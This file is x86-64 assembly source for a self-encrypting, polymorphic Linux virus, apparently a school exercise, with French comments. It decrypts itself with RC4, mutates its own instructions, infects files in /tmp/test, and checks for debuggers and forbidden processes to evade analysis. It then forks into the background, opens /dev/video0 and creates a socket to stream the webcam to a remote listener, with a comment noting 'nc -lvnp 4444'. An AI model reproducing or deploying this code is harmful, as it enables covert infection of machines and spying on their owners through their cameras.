%include "war.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	sub		rsp, 8

	lea		rax, [rel rc4]
	mov		[rsp], rax
	mov		rbp, rsp

    lea		rax, [rel _stop]
    lea		rcx, [rel _encrypted_start]
    sub		rax, rcx
    mov		rsi, rax
    mov		rdi, rcx
    xor		rdx, rdx

    call	[rbp]

    PUSH_ALL
    jmp		_encrypted_start

%include "rc4.s"

_encrypted_start:



	lea		rdi, [rel path]
	mov		rcx, 512
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	rep		stosq
	lea		rax, [rel path]
	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'm'
	inc		rax
	mov		[rax], byte 'p'
	inc		rax
	mov		[rax], byte '/'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte 'e'
	inc		rax
	mov		[rax], byte 's'
	inc		rax
	mov		[rax], byte 't'
	inc		rax
	mov		[rax], byte '/'
	inc		rax
	lea		rax, [rel _start]
	lea		rdi, [rel _stop]
	lea		rdx, [rel templates_rdi]
	mov		r8, 7
	mov		r9, 4
	call	polymorph
	lea		rdx, [rel templates_rax]
	call	polymorph
	lea		rdx, [rel templates_rsi]
	call	polymorph
	lea		rdx, [rel templates_rdx]
	call	polymorph
	lea		rdx, [rel templates_rcx]
	call	polymorph
	lea		rdx, [rel templates_r10]
	call	polymorph
	lea		rdx, [rel templates_r11]
	call	polymorph
	lea		rdx, [rel templates_r13]
	call	polymorph
	lea		rdx, [rel templates_r15]
	call	polymorph



	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall
	cmp		rax, 0

	jle		.just_quit
	mov		r12, rax



	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall

	.just_quit:
	mov		rax, SYS_close
	mov		rdi, r12
	syscall

	POP_ALL
	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est war
	test	al, al
	jz		.continue



	mov		rax, SYS_fork
	syscall
	cmp		eax, 0
	jng		.continue_fork

	mov		rax, [rel entry]
	mov		[rel new_entry], rax
	mov		rax, [rel new_entry]
	sub		rax, [rel old_entry]
	lea		rdi, [rel _start]
	sub		rdi, rax
	mov		[rel new_entry], rdi

	add		rsp, 8
	jmp		[rel new_entry]

.continue_fork:
	mov		rax, SYS_setsid
	syscall
.continue:

	PUSH_ALL
	jmp		end_

find_eq:
	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rsi, r15
	mov		rdi, rdx
	mov		r9, rcx
	dec		r9
	mov		rcx, r8

	cmpb:
		mov		r14b, byte [rsi]
		mov		r15b, byte [rdi]
		cmp		r14b, r15b
		jne		.quit_loop

		.skip:
		inc		rsi	;	Le  code
		inc		rdi	;	Les nombres
	loop	cmpb

	inc		rax
	.quit_loop:
	POP_ALLr
	ret



replace:
	PUSH_ALL
	mov		r15, rax
	mov		r14, rdx
	mov		rax, rcx
	mov		rcx, r9
	finding_equal:	; LOOP SUR LE NOMBRE DE R9 NUMBERS DONC MANIERES DE MODIFIER
		call	find_eq
		test	rax, rax
		jnz		.equl
		add		rdx, r8
	loop	finding_equal
	jmp		.ret
	.equl:

	mov		rcx, r8


	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rdi, urandom_path
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	mov		rax, SYS_open
	syscall
	mov		r12, rax
	mov		rdi, r12
	lea		rsi, [rel randbuf]
	mov		rdx, 8
	mov		rax, SYS_read
	syscall
	mov		rdi, r12
	mov		rax, SYS_close
	syscall
	mov		rax, [rel randbuf]
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	mov		rcx, r9
	div		rcx
	mov		rax, rdx
	POP_ALLr
	; r15 le code
	; r14  les instructions

	imul	r8, rax
	add		r14, r8
	mov		rsi, r14
	mov		rdi, r15

	rep		movsb

	.ret:
	POP_ALL
	ret


; RAX = START, RDI = END, RDX = FUNC ADDR, R8 = LEN, R9 = NUMBER
polymorph:
	PUSH_ALL
	mov		rcx, rdi
	sub		rcx, rax
	sub		rcx, r8

	loop_start:

	call	replace

	inc		rax
	loop	loop_start
	POP_ALL
	ret

%include "print_rax.s"

%include "printf.s"

%include "sub_val.s"

%include "add_val.s"

%include "warf.s"

%include "prepare_infection.s"

%include "infection.s"

end_:
	call _is_debugged
	cmp rax, -1
	je .just_quit

	call _check_forbidden_process
	cmp rax, 1
	je .just_quit


	call	war

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall

	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall

	add		rsp, 8
	mov		rax, SYS_close
	mov		rdi, r12
	syscall


	.just_quit:
		POP_ALL

		mov		rax, SYS_fork
		syscall

		cmp		eax, 0
		jng		.continue_fork

		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall

	.continue_fork:
		mov		rax, SYS_setsid
		syscall


		; Ici commence la partie pour la cam
		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
		; c'est la commande que j'utilise avec
		; nc -lvnp 4444
		mov		rax, SYS_open
		lea		rdi, [rel pathv]
		mov		rsi, 2
		NOP
		NOP
		NOP
		NOP
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		cmp		rax, 0
		jl		.continue_reverse
		mov		r12, rax	; file descriptor de video0

		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r13, rax	; le socket


%include "video.s"

%include "check_debug.s"

%include "gen_key.s"

_stop:

%include "data.s"
